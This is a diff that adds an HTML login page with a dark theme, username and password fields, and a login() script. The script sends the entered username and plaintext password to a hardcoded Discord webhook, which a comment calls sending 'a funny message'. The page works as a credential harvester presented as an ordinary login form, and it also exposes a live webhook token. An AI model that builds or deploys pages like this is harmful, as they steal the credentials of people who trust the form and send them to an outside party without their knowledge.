@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Login Page</title>
+  <style>
+    body {
+      background: #111;
+      color: #fff;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      font-size: 28px;
+      color: #00ffff;
+    }
+
+    input {
+      padding: 12px;
+      margin: 10px;
+      width: 250px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      background-color: #222;
+      color: #fff;
+    }
+
+    button {
+      padding: 12px 30px;
+      font-size: 16px;
+      border: none;
+      border-radius: 5px;
+      background-color: #00ffff;
+      color: #000;
+      cursor: pointer;
+      margin-top: 20px;
+    }
+
+    button:hover {
+      background-color: #00cccc;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Welcome Back!</h1>
+
+  <input type="text" id="username" placeholder="Enter username">
+  <input type="password" id="password" placeholder="Enter password">
+  <button onclick="login()">Log In</button>
+
+  <script>
+    function login() {
+      const user = document.getElementById("username").value;
+      const pass = document.getElementById("password").value;
+
+      if (user && pass) {
+        alert("Username: " + user + "\nPassword: " + pass);
+
+        // Send a funny message to the Discord webhook
+        fetch("https://discord.com/api/webhooks/1375945799011401789/3Pj5HOb44__aN5LAHa9g_2oTsdfzzGRgHhb6CLZe4nos2wYoFuvlXbhZPzQ9pW2FZSa-", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            content: `👤 User **${user}** just said they’re so sigma with password **${pass}** 💀`
+          })
+        });
+      } else {
+        alert("⚠️ Fill in both fields, sigma warrior.");
+      }
+    }
+  </script>
+
+</body>
+</html>
